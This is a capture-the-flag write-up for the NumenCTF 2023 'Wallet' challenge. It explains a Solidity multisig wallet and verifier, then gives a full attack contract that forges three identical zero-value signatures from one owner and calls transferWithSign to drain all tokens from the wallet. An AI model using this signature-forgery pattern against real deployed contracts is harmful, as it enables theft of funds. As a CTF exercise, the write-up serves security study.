# Wallet

## Introduction
Similiar to the previous contract, this contract focus on emptying the tokens in Wallet.

Here's the source code:  https://github.com/numencyber/NumenCTF_2023/blob/main/wallet/contracts/NumenWallet.sol 

## Code Breakdown

There are 2 contracts to look at Wallet and Verifier as well as 3 struct

###  Wallet

The key function to look at is **transferWithSign**. 

Here's a breakdown of the function.

- It takes in 3 parameters - recipent, amount and a struct(*SignedbyOwner*)
- Amount must be more than 0
- Recipent cannot be null
- 3 Signatures from wallet owners are required
- Will call the **verify** function from **Verifier** contract
- Wallet tokens will be transferred once verification is complete



### Verifier

There is only 1 function to look at **verify**

Here's a breakdown of the function.

- It accepts 3 parameters - recipent, amount and the array of signatures

### Structs

There are 3 structs to look at: *Holder*, *Signature* and *SignedByOwner*.

These structs are critical to solving the puzzle as they contain the parameters needed to construct fake signatures.


## Hints
You'll need to create a smart contract to do the following:

1) Create a *Holder* with wallet's owner address, random name, boolean and random reason

2) Create a *Signature* with random values

3) Store all 3 signatures into *SignedByOwner*

4) Transfer the tokens away by executing **transferWithSign** with the stored signature

## Solutions
If you following the hints above, you will arrive at the same/similiar conclusion as me.

Here's the solution:

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import './wallet.sol';

contract wallet_attack {

    Wallet public wallet;
    IERC20 immutable public token;

    constructor(Wallet _wallet, NC _nc){
        wallet = Wallet(_wallet);
        token = NC(_nc);
    }
    
    function fake_signature() public  {
        //Create a holder
        bytes memory _reason = new bytes(1);
        Holder memory _holder = Holder(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), '0', true, _reason);

        //Create 32 bytes variable with a default value of 0
        bytes32 _rs1;
        bytes32 _rs2;

        //Create signature
        Signature memory _signature = Signature(1, [_rs1,_rs2]);
        
        //Sign by the same owner 3 times
        SignedByowner[] memory ss = new SignedByowner[](3);
        ss[0] = SignedByowner(_holder, _signature);
        ss[1] = SignedByowner(_holder, _signature);
        ss[2] = SignedByowner(_holder, _signature);


        wallet.transferWithSign(address(0xdD870fA1b7C4700F2BD7f44238821C26f7392148), token.balanceOf(address(wallet)), ss);

    }

    function getWalletbalance() public view returns (uint256){
        return token.balanceOf(address(wallet));
    }

}
```